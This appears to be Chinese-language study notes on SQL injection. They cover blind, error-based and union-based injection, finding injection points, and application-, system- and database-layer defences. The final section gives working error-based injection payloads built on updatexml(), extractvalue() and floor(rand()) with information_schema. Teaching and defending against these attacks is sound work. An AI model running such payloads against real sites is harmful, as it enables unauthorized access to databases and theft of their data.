sql注入介绍

传入非加密数据的地方可能存在注入点

什么是SQL注入

  • sql注入也是正常的web端口访问
  • 只是转入的参数值并非程序设计者所希望的，而是传入了嵌套SQL代码的参数值
  • 参数值利用程序处理注入者的逻辑，按注入者的期望执行数据库查询
  • 甚至页面呈现按SQL注入者期望的显示
  • 通过应用程序把带有SQL代码的参数传递给数据库引擎

SQL注入漏洞的根本原因

  • 应用程序的问题而不是系统和数据库的问题

网站可用sql注入测试类型

  1. 攻击类型与攻击策略

    1. sql注入类型

      1. 盲注：输出数据库的内容再网页中没有显示
      2. 报错注：充分利用程序、数据库报错的帮助获得所有信息
      3. 显注：注入查询语句的内容在网页中有显示
      4. 其他：email、ftp、samba等协议

    2. 盲注

      1. 在网页中没有找到或者暂时没有找到输出的地方
      2. 确认输入变量可以执行逻辑判断，只得到对或错两种结果
      3. 盲注困难，有时候需要借助工具进行盲注攻击，但花费时间较长，需要耐心

    3. 报错注

      充分利用数据库报错和程序报错所提供的信息，让数据库引擎和程序，暴露出所需要的信息

    4. 显注

      在网页中寻找注入点，把程序正常信息替换为注入者信息

      显注直接得到明文信息，不需要猜测，获得敏感信息容易和快速

  2. 寻找显注注入点

    1. union寻找处理字段数和第三者上位点

      意义：

      1. 逐个测试处理字段数，直到网页显示正常，测试程序对union处理逻辑
      2. 在说明程序处理的字段数室多少
      3. 在网页上显示的第三者上位点室第几个字段

    2. 上位点利用测试

      数据库版本确认version()

      数据库名database()

    3. 字典子查询测试

      1. –的目标是对后面的子句注释掉，这样就能查询我们想要的字典表
      2. table_name显示测试位的可能性和如何替代商品所有选项的可能性

    4. 商品所有选项完全替换

sql注入防御

  1. sql注入应用层防御

    1. 应用层防御目标

      1. sql注入本质原因是应用层的问题
      2. sql注入应用层防御的目标是修复sql所有的可能漏洞

    2. 过滤sql注入基本字符

    3. 过滤sql关键字

    4. url传参的整体加密

  2. 系统层如何防御

    1. 系统层防御目标
      1. sql注入的本质原因不是由系统层的问题
      2. 系统层的防御是辅助的作用，是预防sql注入与系统层交互提权，预防sql注入权限的进一步扩大，使得sql注入在系统层无所作为
    2. 系统层防御方法
      1. iptables限制只允许特定服务器IP和端口登录
      2. 使用应用防火墙对sql注入拒绝waf
      3. 数据库安全中间件：greensql，安全狗

  3. 数据库层防御

    1. 数据库层防御目标
      1. sql注入本质不在数据库层的问题
      2. 数据库层防御的目标是辅助性的，预防sql注入在数据层交互提权，防止sql注入成功后权限和数据进一步泄露进一步扩大
    2. sql权限的最小化
      1. revoke收回权限
      2. 程序连接的权限分配以最小化为原则
    3. 数据库层规范化要求
      1. 这个DBA专业的sql设计审计要求
      2. 如何设计尽量保持高性能，同时也要预防sql测试出错的可能性
      3. 数据库架构设计考虑性能与安全的权衡，通常在保障性能的前提下去考虑安全性的折中

报错注入

  • updatexml()

    • 函数作用：改变（查找并替换）XML 文档中符合条件的节点的值

    • 语法：UPDATEXML (XML_document, XPath_string, new_value)

    • 参数

      • 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
      • 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。
      • 第三个参数：new_value，String格式，替换查找到的符合条件的数据

    • 例如：updatexml(1, concat(0x7e, version()), 0)#

  • extractvalue()

    • 函数作用：从目标XML中返回包含所查询值的字符串

    • 语法：ExtractValue(xml_document, XPathstring)

    • 参数

      • 第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称
      • 第二个参数： XPathstring，XPath 格式的字符串

    • 例如：extractvalue(1,concat(0x7e,database()))#

  • floor()

    • 函数作用：向下取整

    • 语法：floor()

    • 如果要用 floor() 构成报错，必须满足下面的条件

      • 运算中有 count
      • 运算中有 group by
      • 运算中有 rand

    • 例如：(select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a)#
